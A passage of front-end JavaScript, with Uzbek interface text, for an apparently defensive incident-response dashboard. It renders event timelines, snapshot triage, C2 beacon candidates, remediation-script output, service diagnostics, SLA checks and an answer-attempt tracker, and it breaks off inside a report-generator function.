            .filter(x => x.confidence === 'high' || x.confidence === 'medium')
            .map(x => `<span class="tech-tag" onclick="showMitreModal('${x.technique}', event)">${x.technique}</span>`)
            .join(' ');
            
        tableHtml += `
            <tr class="cursor-pointer" onclick="showEventDrawer(${t._originalIndex})">
                <td style="font-family:var(--font-mono); font-size:11.5px; color:var(--text-muted);" title="${escapeHtml(t.ts || '')}">${escapeHtml(t.ts_disp || t.ts || '')}</td>
                <td><b>${escapeHtml(t.host || '—')}</b></td>
                <td class="code-cell" title="${fullCmd}">${cmdDisplay}</td>
                <td>${techTags || '<span style="color:var(--text-dim); font-size:11px;">—</span>'}</td>
                <td>${badgeClass ? `<span class="badge ${badgeClass}">${conf}</span>` : '—'}</td>
                <td>
                    <div style="display:flex; gap:4px;" onclick="event.stopPropagation()">
                        ${t.primary_technique ? trackerBtn(t.primary_technique) : ''}
                        ${copyBtn(t.command_line_full || t.command_line || '')}
                    </div>
                </td>
            </tr>
        `;
    }
    tableHtml += `</tbody></table></div>`;
    container.innerHTML = tableHtml;
    
    // Pagination Controls
    let pagHtml = `
        <div>
            Ko'rsatilmoqda: <b>${(startIdx + 1).toLocaleString()}–${endIdx.toLocaleString()}</b> / jami <b>${total.toLocaleString()}</b> ta
        </div>
        <div class="pagination-controls">
            <button class="page-btn" onclick="goToPage(1)" ${currentPage === 1 ? 'disabled' : ''}>⏮</button>
            <button class="page-btn" onclick="goToPage(${currentPage - 1})" ${currentPage === 1 ? 'disabled' : ''}>◀ Oldingi</button>
            <span style="font-size:12px; font-weight:600; padding:0 8px;">${currentPage} / ${totalPages}</span>
            <button class="page-btn" onclick="goToPage(${currentPage + 1})" ${currentPage === totalPages ? 'disabled' : ''}>Keyingi ▶</button>
            <button class="page-btn" onclick="goToPage(${totalPages})" ${currentPage === totalPages ? 'disabled' : ''}>⏭</button>
            <select style="width:auto; margin-bottom:0; padding:4px 8px; font-size:12px; margin-left:8px;" onchange="changePageSize(this.value)">
                <option value="25" ${pageSize===25?'selected':''}>25 / sahifa</option>
                <option value="50" ${pageSize===50?'selected':''}>50 / sahifa</option>
                <option value="100" ${pageSize===100?'selected':''}>100 / sahifa</option>
                <option value="500" ${pageSize===500?'selected':''}>500 / sahifa</option>
            </select>
        </div>
    `;
    if (paginationBar) paginationBar.innerHTML = pagHtml;
}

function goToPage(page) {
    currentPage = page;
    renderTimelinePage();
}

function changePageSize(val) {
    pageSize = parseInt(val, 10) || 50;
    currentPage = 1;
    renderTimelinePage();
}

// ==================== Responder Functions ====================
function cleanPath(v) {
    if (!v) return '';
    v = v.trim();
    if (v.startsWith('"') && v.endsWith('"')) {
        v = v.slice(1, -1).trim();
    }
    return v;
}

async function getRespArgs() {
    let args = {};
    const snapFile = document.getElementById('resp-snap-file')?.files?.[0];
    if (snapFile) {
        args.current_content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(snapFile); });
        args.current_filename = snapFile.name;
    } else {
        const cur = document.getElementById('resp-cur')?.value || '';
        if (cur.startsWith('{')) args.current = cur;
        else args.current_path = cleanPath(cur);
    }
    
    const basFile = document.getElementById('resp-base-file')?.files?.[0];
    if (basFile) {
        args.baseline = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(basFile); });
    } else {
        const bas = document.getElementById('resp-base')?.value || '';
        if (bas) {
            if (bas.startsWith('{')) args.baseline = bas;
            else args.baseline_path = cleanPath(bas);
        }
    }
    
    const protText = document.getElementById('resp-prot')?.value || '';
    let prot = [];
    if (protText) {
        protText.split('\n').forEach(l => {
            let m = l.trim().match(/^- (.+)$/);
            if (m) prot.push(m[1].split('#')[0].trim());
        });
    }
    args.protected = prot;
    
    const logsFile = document.getElementById('resp-logs-file')?.files?.[0];
    if (logsFile) {
        args.from_logs_content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(logsFile); });
        args.from_logs_filename = logsFile.name;
    } else {
        const logsPath = document.getElementById('resp-logs')?.value || '';
        if (logsPath) args.from_logs_path = cleanPath(logsPath);
    }
    
    return args;
}

function renderSnapshotMissingWarning(targetOut) {
    targetOut.innerHTML = `
        <div class="card" style="border-color:var(--cyber-amber); background:var(--cyber-amber-bg); box-shadow:0 0 20px rgba(255,183,3,0.15);">
            <div style="display:flex; align-items:flex-start; gap:16px;">
                <span style="font-size:32px; line-height:1;">⚠️</span>
                <div style="flex:1;">
                    <h4 style="color:var(--cyber-amber); font-weight:800; font-size:15px; letter-spacing:0.5px;">Joriy Snapshot Kiritilmadi</h4>
                    <p style="font-size:12.5px; color:var(--text-secondary); margin-top:6px; line-height:1.6;">
                        Tahlil qilish yoki xavflarni aniqlash uchun nishon tizimdan olingan <code>snapshot.json</code> faylini yuklang yoki pastdagi demo tugmani bosing:
                    </p>
                    <div style="margin-top:12px;">
                        <button type="button" class="btn btn-demo btn-sm" onclick="loadDemoSnapshot()">⚡ Namuna Snapshotni Yuklash (Compromised Web Server)</button>
                    </div>
                </div>
            </div>
        </div>
    `;
}

async function respTriage() {
    const out = document.getElementById('resp-out');
    const args = await getRespArgs();
    if (!args.current_content && !args.current && !args.current_path) {
        return renderSnapshotMissingWarning(out);
    }
    
    out.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>Triage tahlili bajarilmoqda...</p></div>';
    const res = await api('/api/resp/triage', 'POST', args);
    if (res.error) return out.innerHTML = `<div class="card" style="color:var(--cyber-red); border-color:var(--cyber-red-border);">${escapeHtml(res.error)}</div>`;
    
    let html = '<div class="card card-hud">';
    const findings = res.findings || res;
    const extra = res.extra || {};
    
    html += '<div class="card-title"><span>🛡 Aniqlangan Anomaliyalar &amp; Xavflar (Findings)</span><span class="brand-badge">' + findings.length + ' ta</span></div>';
    const rows = findings.map(f => [
        `<b>${f.score}</b>`,
        `<span class="badge badge-${f.confidence}">${f.confidence}</span>`,
        `<span class="badge badge-low">${escapeHtml(f.category)}</span>`,
        `<code class="code-cell">${escapeHtml(f.item)}</code>`,
        (f.techniques||[]).map(t => `<span class="tech-tag" onclick="showMitreModal('${t.id}')">${t.id}</span>`).join(' '),
        f.protected ? '<span class="badge badge-success">PROTECTED</span>' : '—',
        f.log_confirmed ? '<span class="log-tag">✔ LOG</span>' : '—',
        (f.reasons||[]).join(', ')
    ]);
    html += renderTable(["Ball (Score)", "Ishonch", "Kategoriya", "Ob'ekt (Item)", "Texnikalar", "Himoyalangan", "Log Tasdiqi", "Sabablar"], rows);
    
    if (extra.unmatched_log_artifacts && extra.unmatched_log_artifacts.length > 0) {
        html += `<div style="margin-top:20px; padding:14px; background:var(--cyber-red-bg); border:1px solid var(--cyber-red-border); border-radius:var(--radius-md);">
            <h4 style="color:var(--cyber-red); margin-bottom:8px;">⚠️ Loglarda bor, lekin Snapshotda topilmadi — QO'LDA TEKSHIRING:</h4>
            <ul style="margin-left:20px; font-size:12.5px; color:var(--text-primary);">`;
        extra.unmatched_log_artifacts.forEach(u => {
            html += `<li style="margin-bottom:4px;"><code>${escapeHtml(u.artifact)}</code> (Dalil: ${escapeHtml(u.evidence)})</li>`;
        });
        html += '</ul>';
        if (extra.unmatched_other && extra.unmatched_other.length) {
            html += `<p style="font-size:12px; color:var(--text-dim); margin-top:6px;">+${extra.unmatched_other.length} ta boshqa host / fon artefakti yashirildi (boshqa hostlar snapshotida tekshiring).</p>`;
        }
        html += '</div>';
    }
    if (extra.beacon_candidates && extra.beacon_candidates.length) {
        const bRows = extra.beacon_candidates.map(b => [
            `<code>${escapeHtml(b.ip)}</code>`, escapeHtml(b.key || ''),
            `~${Math.round(b.interval_seconds || 0)}s`, escapeHtml(String(b.count ?? ''))
        ]);
        html += `<h4 style="color:var(--cyber-red); margin:18px 0 8px;">🛰 C2 beacon nomzodlari (tashqi, davriy) — tekshirib BLOKLANG</h4>`;
        html += renderTable(["IP", "Manba", "Interval", "Ulanishlar"], bRows);
    }
    html += '</div>';
    out.innerHTML = html;
}

async function respFix() {
    const out = document.getElementById('resp-out');
    const args = await getRespArgs();
    if (!args.current_content && !args.current && !args.current_path) {
        return renderSnapshotMissingWarning(out);
    }
    
    out.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>Remediation buyruqlari generatsiya qilinmoqda...</p></div>';
    args.os = document.getElementById('resp-os')?.value || 'windows';
    args.full = document.getElementById('resp-full')?.checked || false;
    const res = await api('/api/resp/fix', 'POST', args);
    if (res.error) return out.innerHTML = `<div class="card" style="color:var(--cyber-red); border-color:var(--cyber-red-border);">${escapeHtml(res.error)}</div>`;
    
    out.innerHTML = `
        <div class="card card-hud">
            <div class="card-title">
                <span>🛡 Generatsiya qilingan Tozalash Skripti (${args.os.toUpperCase()})</span>
                <button class="btn btn-primary btn-sm" onclick="copyText(document.getElementById('fix-script-pre').innerText)">📋 Skriptdan Nusxa Olish</button>
            </div>
            <p style="font-size:12px; color:var(--text-secondary); margin-bottom:12px;">
                Eslatma: Nishon tizimda hech narsa avtomatik bajarilmaydi. Buyruqlarni tekshirib, qo'lda terminalda ishga tushiring.
            </p>
            <pre id="fix-script-pre" style="max-height:450px;">${escapeHtml(res.script)}</pre>
        </div>
    `;
}

async function respFraud() {
    const out = document.getElementById('resp-out');
    const args = await getRespArgs();
    if (!args.current_content && !args.current && !args.current_path) {
        return renderSnapshotMissingWarning(out);
    }
    
    out.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>Fraud &amp; RAT tekshiruvi bajarilmoqda...</p></div>';
    const res = await api('/api/resp/fraud', 'POST', args);
    if (res.error) return out.innerHTML = `<div class="card" style="color:var(--cyber-red);">${escapeHtml(res.error)}</div>`;
    
    if (!Array.isArray(res) || res.length === 0) {
        out.innerHTML = `
            <div class="card" style="border-color:var(--cyber-mint-border); background:rgba(0,245,212,0.06);">
                <div class="card-title">
                    <span style="color:var(--cyber-mint);">🛡 Fraud &amp; RAT Tekshiruvi Natijasi</span>
                    <span class="brand-badge" style="border-color:var(--cyber-mint); color:var(--cyber-mint);">Toza (Clean)</span>
                </div>
                <p style="color:var(--text-primary); font-size:13px;">✅ Snapshotda masofaviy boshqaruv dasturlari (RAT), hosts fayl, root sertifikat, proksi, DNS, portproxy, firewall bo'yicha shubhali o'zgarishlar aniqlanmadi.</p>
            </div>
        `;
        return;
    }
    
    let html = '<div class="card card-hud">';
    html += '<div class="card-title"><span>⚠️ Shubhali Fraud / RAT Ko\'rsatkichlari</span><span class="brand-badge" style="border-color:var(--cyber-red); color:var(--cyber-red);">' + res.length + ' ta</span></div>';
    const rows = res.map(f => {
        let confCls = 'low';
        if (f.confidence === 'high') confCls = 'high';
        else if (f.confidence === 'medium' || f.confidence === 'med') confCls = 'medium';
        const ishonch = `<span class="badge badge-${confCls}">${escapeHtml(f.confidence)}</span>`;
        const texnikalar = (f.techniques||[]).map(t => {
            if (/^T\d{4}(\.\d{3})?$/.test(t.id)) {
                return `<span class="tech-tag" onclick="showMitreModal('${t.id}')">${t.id}</span>`;
            }
            return escapeHtml(t.id);
        }).join(' ');
        const sabablar = (f.reasons||[]).map(escapeHtml).join(', ');
        return [
            ishonch,
            escapeHtml(f.category),
            `<code class="code-cell">${escapeHtml(f.item)}</code>`,
            texnikalar,
            sabablar
        ];
    });
    html += renderTable(["Ishonch", "Kategoriya", "Ob'ekt (Item)", "Texnikalar", "Sabablar"], rows);
    html += '</div>';
    out.innerHTML = html;
}

async function respDoctor() {
    const out = document.getElementById('resp-out');
    const args = await getRespArgs();
    if (!args.current_content && !args.current && !args.current_path) {
        return renderSnapshotMissingWarning(out);
    }
    
    const svcName = document.getElementById('resp-doc-svc')?.value?.trim();
    if (!svcName) {
        out.innerHTML = `
            <div class="card" style="border-color:var(--cyber-amber); background:var(--cyber-amber-bg);">
                <span style="color:var(--cyber-amber); font-weight:700;">⚠️ Iltimos, to'xtagan servis nomini kiriting (masalan: nginx, apache2, sshd yoki mysql).</span>
            </div>
        `;
        return;
    }
    
    out.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>Servis diagnostikasi o\'tkazilmoqda...</p></div>';
    args.service = svcName;
    const res = await api('/api/resp/doctor', 'POST', args);
    if (res.error) return out.innerHTML = `<div class="card" style="color:var(--cyber-red);">${escapeHtml(res.error)}</div>`;
    
    let html = '<div class="card card-hud">';
    html += `<div class="card-title"><span>🩺 Servis Diagnostikasi: ${escapeHtml(svcName)}</span></div>`;
    if (!Array.isArray(res) || res.length === 0) {
        html += '<p style="color:var(--cyber-mint); font-size:13px;">✅ Ushbu servis konfiguratsiyasida bloklangan yoki xavfli holat aniqlanmadi.</p>';
    } else {
        const rows = res.map(d => [
            `<span class="badge badge-high">${escapeHtml(d.cause || "Noma'lum")}</span>`,
            escapeHtml(d.evidence || "—"),
            `<code class="code-cell">${escapeHtml(d.suggested_fix_command || "—")}</code>`,
            d.suggested_fix_command ? `<button class="action-btn" onclick="copyText('${escapeHtml(d.suggested_fix_command)}')">📋 Nusxa</button>` : '—'
        ]);
        html += renderTable(["Sabab (Cause)", "Dalil (Evidence)", "Tuzatish Buyrug'i", "Amal"], rows);
    }
    html += '</div>';
    out.innerHTML = html;
}

async function respSla(isAuto = false) {
    const out = document.getElementById('resp-out');
    const yamlText = document.getElementById('resp-sla-yaml')?.value?.trim();
    
    if (!yamlText) {
        if (slaTimer) { clearInterval(slaTimer); slaTimer = null; }
        out.innerHTML = `<div class="card" style="color:var(--amber); border-color:var(--amber);">SLA konfigi kiritilmagan — services.yaml ni yuklang</div>`;
        return;
    }

    if (!isAuto) {
        out.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>SLA holati tekshirilmoqda...</p></div>';
    }

    const args = { services_yaml: yamlText };
    const res = await api('/api/resp/sla', 'POST', args);
    
    if (res.error) {
        if (slaTimer) { clearInterval(slaTimer); slaTimer = null; }
        out.innerHTML = `<div class="card card-hud" style="border-color:var(--cyber-red); color:var(--cyber-red);">${escapeHtml(res.error)}</div>`;
        return;
    }
    
    let autoUpdateHtml = `
        <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; padding: 10px; background: var(--bg-input); border-radius: var(--radius-sm); border: 1px solid var(--border);">
            <div style="display: flex; align-items: center; gap: 10px;">
                <label class="checkbox-label" style="margin: 0;">
                    <input type="checkbox" id="sla-auto-chk" onchange="toggleSlaAuto()"> Avto-yangilash
                </label>
                <select id="sla-interval" style="margin: 0; padding: 4px; max-width: 100px;" onchange="toggleSlaAuto()">
                    <option value="15000">15 soniya</option>
                    <option value="30000" selected>30 soniya</option>
                    <option value="60000">60 soniya</option>
                </select>
            </div>
            <div style="font-size: 12px; color: var(--text-muted);">
                Oxirgi yangilanish: <b>${new Date().toLocaleTimeString()}</b>
            </div>
        </div>
    `;

    let cOk = 0, cDeg = 0, cDown = 0;
    res.forEach(s => {
        if (s.state === 'ok') cOk++;
        else if (s.state === 'degraded') cDeg++;
        else cDown++;
        
        let oldState = slaStates[s.name];
        if (isAuto && oldState && oldState !== s.state) {
            let stMap = { 'ok': 'TIRIK', 'degraded': 'QISMAN', 'down': "O'LGAN" };
            showToast(`${s.name}: ${stMap[oldState] || oldState} -> ${stMap[s.state] || s.state}`);
        }
        slaStates[s.name] = s.state;
    });

    let html = '<div class="card card-hud">';
    html += autoUpdateHtml;
    
    html += `<div style="display: flex; gap: 10px; margin-bottom: 14px;">
                <div class="hud-pill hud-pill-online">TIRIK: ${cOk}</div>
                <div class="hud-pill" style="border-color: var(--amber); color: var(--amber);">QISMAN: ${cDeg}</div>
                <div class="hud-pill" style="border-color: var(--cyber-red); color: var(--cyber-red);">O'LGAN: ${cDown}</div>
             </div>`;
             
    html += '<div style="display: grid; grid-template-columns: 1fr; gap: 14px;">';
    
    res.forEach(s => {
        let bClass = '', bText = '';
        if (s.state === 'ok') { bClass = 'badge-success'; bText = 'TIRIK'; }
        else if (s.state === 'degraded') { bClass = 'badge-medium'; bText = 'QISMAN'; }
        else { bClass = 'badge-high'; bText = "O'LGAN"; }
        
        let title = s.board_name ? `${s.name} (${s.board_name})` : s.name;
        
        html += `<div style="border: 1px solid var(--border-card); border-radius: var(--radius-md); padding: 12px; background: var(--bg-card);">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                        <b style="font-size: 14px;">${escapeHtml(title)}</b>
                        <span class="badge ${bClass}">${bText}</span>
                    </div>
                    <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 8px;">${escapeHtml(s.detail)}</div>
                    <div>`;
                    
        (s.checks || []).forEach(c => {
            let cIcon = c.ok ? '✅' : '❌';
            let critBadge = c.critical ? '<span class="badge badge-high" style="font-size: 10px; padding: 2px 4px; margin-left: 4px;">Kritik</span>' : '';
            html += `<div style="font-size: 12px; padding: 4px 0; border-top: 1px dashed var(--border);">
                        ${cIcon} [${escapeHtml(c.type)}] ${escapeHtml(c.detail)} - ${c.ms}ms ${critBadge}
                     </div>`;
        });
                    
        html += `   </div>
                    <div style="font-size: 11px; color: var(--text-dim); text-align: right; margin-top: 8px;">${escapeHtml(s.checked_at)}</div>
                 </div>`;
    });
    
    html += '</div></div>';
    out.innerHTML = html;
    
    let chk = document.getElementById('sla-auto-chk');
    if (chk && slaTimer) {
        chk.checked = true;
    }
}

function toggleSlaAuto() {
    let chk = document.getElementById('sla-auto-chk');
    let sel = document.getElementById('sla-interval');
    if (slaTimer) {
        clearInterval(slaTimer);
        slaTimer = null;
    }
    if (chk && chk.checked) {
        let ms = parseInt(sel.value) || 30000;
        slaTimer = setInterval(() => {
            respSla(true);
        }, ms);
    }
}

function readSlaFile(input) {
    if (!input.files || input.files.length === 0) return;
    const file = input.files[0];
    const reader = new FileReader();
    reader.onload = function(e) {
        const ta = document.getElementById('resp-sla-yaml');
        if (ta) ta.value = e.target.result;
    };
    reader.readAsText(file);
}

function readProtFile(input) {
    if (!input.files || input.files.length === 0) return;
    const file = input.files[0];
    const reader = new FileReader();
    reader.onload = function(e) {
        const ta = document.getElementById('resp-prot');
        if (ta) ta.value = e.target.result;
    };
    reader.readAsText(file);
}

// ==================== Tracker Functions ====================
let trkEditingId = null;

// Nomzodlar ro'yxati; eski UI majburiy maydonni to'ldirish uchun yozilgan "?" nomzod hisoblanmaydi
function trkCands(s) {
    return String(s || '').split(',').map(c => c.trim()).filter(c => c && !/^\?+$/.test(c));
}

async function loadTracker() {
    const out = document.getElementById('trk-out');
    const res = await api('/api/tracker');
    if (res.error) {
        out.innerHTML = `<div class="card" style="color:var(--red); border-color:var(--red-border); background:var(--red-bg); padding:15px; margin-top:20px;">${escapeHtml(res.error)}</div>`;
        return;
    }
    
    if (!res || !res.length) {
        out.innerHTML = '<div class="card" style="color:var(--text-dim); text-align:center; padding:30px;">Trackerda hali savollar yo\'q. Yuqoridagi forma orqali qo\'shing.</div>';
        return;
    }
    window.trkRows = res;
    
    let html = '<div class="card"><div class="table-responsive"><table><thead><tr><th>Savol</th><th>Nomzodlar</th><th>Dalil</th><th>Status</th><th>Urinishlar</th><th>Amallar</th></tr></thead><tbody>';
    
    for (let i = 0; i < res.length; i++) {
        const r = res[i];
        if (trkEditingId === r.id) {
            html += `<tr>
                <td><input type="text" id="trk-e-q" value="${escapeHtml(r.question)}" style="width:100%; margin-bottom:0;"></td>
                <td><input type="text" id="trk-e-c" value="${escapeHtml(r.candidates || '')}" style="width:100%; margin-bottom:0;"></td>
                <td><input type="text" id="trk-e-e" value="${escapeHtml(r.evidence || '')}" style="width:100%; margin-bottom:0;"></td>
                <td>
                    <input type="text" id="trk-e-s" value="${escapeHtml(r.status || '')}" style="width:100%; margin-bottom:4px;" placeholder="Status">
                    <br><input type="number" id="trk-e-m" value="${r.max_attempts || ''}" style="width:100%; margin-bottom:0;" placeholder="Maks. urinish" min="1">
                </td>
                <td></td>
                <td>
                    <div style="display:flex; flex-direction:column; gap:4px;">
                        <button class="action-btn btn-sm" onclick="trkSave('${r.id}')">💾 Saqlash</button>
                        <button class="action-btn btn-sm" onclick="trkEditingId=null; loadTracker();">Bekor</button>
                    </div>
                </td>
            </tr>`;
        } else {
            let candsHtml = '<span style="color:var(--text-dim)">— hali yo\'q</span>';
            if (trkCands(r.candidates).length) {
                candsHtml = trkCands(r.candidates).map(c =>
                    `<span class="tech-tag" data-v="${escapeHtml(c)}" onclick="showMitreModal(this.dataset.v)">${escapeHtml(c)}</span>`
                ).join(' ');
            }
            
            let statHtml = escapeHtml(r.status || '');
            if (r.solved) statHtml = `<span class="badge badge-success">✅ Qabul qilindi</span> ` + statHtml;
            else if (r.exhausted) statHtml = `<span class="badge badge-high">⛔ Urinishlar tugadi</span> ` + statHtml;
            
            let maxStr = r.max_attempts === null ? '?' : r.max_attempts;
            let usedStr = r.used || 0;
            let attemptColor = 'neutral';
            if (r.solved) attemptColor = 'green';
            else if (r.exhausted || r.remaining === 0) attemptColor = 'red';
            else if (r.remaining === 1) attemptColor = 'yellow';
            
            let attemptsHtml = `<div class="trk-att-${attemptColor}" style="font-weight:bold; font-size:14px; margin-bottom:5px;">${usedStr}/${maxStr}</div>`;
            if (r.attempts && r.attempts.length > 0) {
                attemptsHtml += `<div style="font-size:12px;">` + r.attempts.map((att, idx) => {
                    let badgeColor = att.result === 'accepted' ? 'badge-success' : (att.result === 'rejected' ? 'badge-high' : 'badge-medium');
                    let dt = escapeHtml(String(att.at || '').replace('T', ' ').replace('Z', ' UTC'));
                    return `<div style="margin-top:4px; padding:4px; background:var(--bg-lighter); border-radius:4px; display:flex; align-items:center; gap:4px; flex-wrap:wrap;">
                        <span style="color:var(--text-dim)">#${idx+1}</span>
                        <b>${escapeHtml(att.answer)}</b> 
                        <span class="badge ${badgeColor}">${escapeHtml(att.result)}</span>
                        <span style="color:var(--text-dim); font-size:10px;">${dt}</span>
                        <select onchange="trkSetResult('${r.id}', ${idx}, this.value)" style="padding:0; margin:0; font-size:11px; width:auto; height:auto; margin-bottom:0;">
                            <option value="pending" ${att.result==='pending'?'selected':''}>pending</option>
                            <option value="rejected" ${att.result==='rejected'?'selected':''}>rejected</option>
                            <option value="accepted" ${att.result==='accepted'?'selected':''}>accepted</option>
                        </select>
                        <button class="action-btn btn-sm" onclick="trkDelAttempt('${r.id}', ${idx})" style="color:var(--red); padding:0 4px; height:20px;">✕</button>
                    </div>`;
                }).join('') + `</div>`;
            }
            attemptsHtml += `<div id="trk-att-form-${r.id}"></div>`;
            
            let actionsHtml = `<div style="display:flex; flex-direction:column; gap:4px;">
                <button class="action-btn btn-sm" onclick="trkEditingId='${r.id}'; loadTracker();">✏️ Tahrirlash</button>
                <button class="action-btn btn-sm" onclick="trkAttemptForm('${r.id}')">🎯 Topshirish</button>`;
            if (trkCands(r.candidates).length) {
                actionsHtml += `<button class="action-btn btn-sm" data-v="${escapeHtml(trkCands(r.candidates).join(', '))}" onclick="copyText(this.dataset.v)">📋 Nusxa</button>`;
            }
            actionsHtml += `<button class="action-btn btn-sm" style="border-color:var(--red-border); color:var(--red);" onclick="trkDelBtn('${r.id}')">O'chirish</button>
            </div>`;
            
            html += `<tr>
                <td>${escapeHtml(r.question)}</td>
                <td>${candsHtml}</td>
                <td>${escapeHtml(r.evidence)}</td>
                <td>${statHtml}</td>
                <td>${attemptsHtml}</td>
                <td>${actionsHtml}</td>
            </tr>`;
        }
    }
    
    html += '</tbody></table></div></div>';
    out.innerHTML = html;
    
    if (trkEditingId) document.addEventListener('keydown', trkEditKeyHandler);
    else document.removeEventListener('keydown', trkEditKeyHandler);
}

function trkEditKeyHandler(e) {
    if (e.key === 'Enter' && trkEditingId) trkSave(trkEditingId);
    else if (e.key === 'Escape') { trkEditingId = null; loadTracker(); }
}

async function trkAdd() {
    const qField = document.getElementById('trk-q');
    const cField = document.getElementById('trk-c');
    const eField = document.getElementById('trk-e');
    const sField = document.getElementById('trk-s');
    const mField = document.getElementById('trk-max');
    
    if (!qField.value.trim()) {
        alert("Savol matnini kiriting!");
        return;
    }
    
    const body = {
        question: qField.value,
        candidates: cField.value,
        evidence: eField.value,
        status: sField.value || 'tekshirilmoqda',
        max_attempts: mField.value || ""
    };
    
    const res = await api('/api/tracker', 'POST', body);
    if (res.error) {
        alert(res.error);
        return;
    }
    
    qField.value = ''; cField.value = ''; eField.value = ''; sField.value = ''; mField.value = '';
    showToast("✓ Trackerdagi savol saqlandi!");
    loadTracker();
}

function trkDelBtn(id) {
    if (confirm("Savolni o'chirasizmi?")) trkDel(id);
}

async function trkDel(id) {
    await api(`/api/tracker/${id}`, 'DELETE');
    showToast("O'chirildi");
    loadTracker();
}

async function trkSave(id) {
    const body = {
        question: document.getElementById('trk-e-q').value,
        candidates: document.getElementById('trk-e-c').value,
        evidence: document.getElementById('trk-e-e').value,
        status: document.getElementById('trk-e-s').value,
        max_attempts: document.getElementById('trk-e-m').value || ""
    };
    const res = await api(`/api/tracker/${id}`, 'PUT', body);
    if (res.error) { alert(res.error); return; }
    trkEditingId = null;
    showToast("✓ Saqlandi");
    loadTracker();
}

function trkAttemptForm(id) {
    const r = window.trkRows.find(x => x.id === id);
    if (!r) return;
    const container = document.getElementById(`trk-att-form-${id}`);
    if (!container) return;
    
    // Default: shu savolga hali topshirilmagan birinchi nomzod
    const tried = new Set((r.attempts || []).map(a => String(a.answer).trim().toUpperCase()));
    const defaultCand = trkCands(r.candidates).find(c => !tried.has(c.toUpperCase())) || '';
    
    container.innerHTML = `
        <div style="margin-top:8px; padding:8px; background:var(--bg-card); border:1px solid var(--border-card); border-radius:4px;">
            <input type="text" id="trk-af-ans-${id}" value="${escapeHtml(defaultCand)}" oninput="trkCheckAttempt('${id}')" style="width:100%; margin-bottom:4px; font-size:12px; padding:4px;" placeholder="Javob">
            <select id="trk-af-res-${id}" style="width:100%; margin-bottom:4px; font-size:12px; padding:4px;">
                <option value="pending">pending</option>
                <option value="rejected">rejected</option>
                <option value="accepted">accepted</option>
            </select>
            <div id="trk-af-warn-${id}" style="font-size:11px; margin-bottom:6px; min-height:14px;"></div>
            <div style="display:flex; gap:4px;">
                <button class="action-btn btn-sm" style="color:var(--green); border-color:var(--green-border);" onclick="trkSubmitAttempt('${id}', false)">✔ Yozish</button>
                <button class="action-btn btn-sm" onclick="document.getElementById('trk-att-form-${id}').innerHTML=''">Bekor</button>
            </div>
        </div>
    `;
    trkCheckAttempt(id);
}

let trkCheckTimer = {};
function trkCheckAttempt(id) {
    clearTimeout(trkCheckTimer[id]);
    trkCheckTimer[id] = setTimeout(async () => {
        const ans = document.getElementById(`trk-af-ans-${id}`);
        const warn = document.getElementById(`trk-af-warn-${id}`);
        if (!ans || !warn) return;
        const res = await api(`/api/tracker/${id}/check`, 'POST', { answer: ans.value });
        if (res.error) {
            warn.innerHTML = `<span style="color:var(--red);">${escapeHtml(res.error)}</span>`;
            return;
        }
        if (res.warnings && res.warnings.length > 0) {
            warn.innerHTML = res.warnings.map(w => `<div style="color:var(--amber);">⚠ ${escapeHtml(w)}</div>`).join('');
        } else {
            if (res.max === null) warn.innerHTML = `<span style="color:var(--text-dim);">Limit kiritilmagan</span>`;
            else warn.innerHTML = `<span style="color:var(--green);">Qolgan urinish: ${res.remaining}</span>`;
        }
    }, 250);
}

async function trkSubmitAttempt(id, force) {
    const ans = document.getElementById(`trk-af-ans-${id}`);
    const resSel = document.getElementById(`trk-af-res-${id}`);
    if (!ans || !resSel) return;
    
    const res = await api(`/api/tracker/${id}/attempts`, 'POST', { answer: ans.value, result: resSel.value, force: force });
    
    if (res.needs_confirm) {
        if (confirm("⚠ " + (res.check.warnings || []).join("\n") + "\n\nBaribir yozilsinmi?")) {
            trkSubmitAttempt(id, true);
        }
        return;
    }
    
    if (res.error) {
        alert(res.error);
        return;
    }
    
    const r = res.check || {used: "?", max: "?"};
    showToast(`✓ Urinish yozildi: ${r.used}/${r.max===null?'?':r.max}`);
    if (res.ledger_warning) showToast(res.ledger_warning);
    loadTracker();
}

async function trkSetResult(id, n, result) {
    const res = await api(`/api/tracker/${id}/attempts/${n}`, 'PUT', { result });
    if (res.error) alert(res.error);
    loadTracker();
}

async function trkDelAttempt(id, n) {
    if (confirm("Ushbu urinishni o'chirasizmi?")) {
        await api(`/api/tracker/${id}/attempts/${n}`, 'DELETE');
        loadTracker();
    }
}

async function trkValidateAll() {
    const res = await api('/api/tracker');
    if (res.error) return;
    for (let row of res) {
        if (trkCands(row.candidates).length) {
            const cands = trkCands(row.candidates);
            let new_c = [];
            let changed = false;
            for (let cand of cands) {
                const v = await api(`/api/validate?ids=${encodeURIComponent(cand)}`);
                if (!v.error && v.length > 0) {
                    const r = v[0];
                    if (r.status === 'revoked' && r.replacement) {
                        new_c.push(r.replacement);
                        changed = true;
                    } else {
                        new_c.push(r.input);
                    }
                } else {
                    new_c.push(cand);
                }
            }
            if (changed) {
                await api(`/api/tracker/${row.id}`, 'PUT', {candidates: new_c.join(', ')});
            }
        }
    }
    showToast("✓ Barcha ID'lar tekshirildi va yangilandi!");
    loadTracker();
}

// ==================== Report Generator ====================
async function reportGenerate() {
    const data = {
        lang: document.getElementById('rep-lang').value,
        meta: {
            title: document.getElementById('rep-title').value,
            org: document.getElementById('rep-org').value,
            team: document.getElementById('rep-team').value,
            analyst: document.getElementById('rep-analyst').value,
            date: document.getElementById('rep-date').value,
            exec_summary: document.getElementById('rep-exec').value,
            recommendations: document.getElementById('rep-rec').value
        }
    };

    const logsFile = document.getElementById('rep-logs-file')?.files?.[0];
    if (logsFile) {
        data.logs_content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(logsFile); });
        data.logs_filename = logsFile.name;
    } else {
        data.logs_path = document.getElementById('rep-logs')?.value || '';
    }

    const respFile = document.getElementById('rep-resp-file')?.files?.[0];
    if (respFile) {
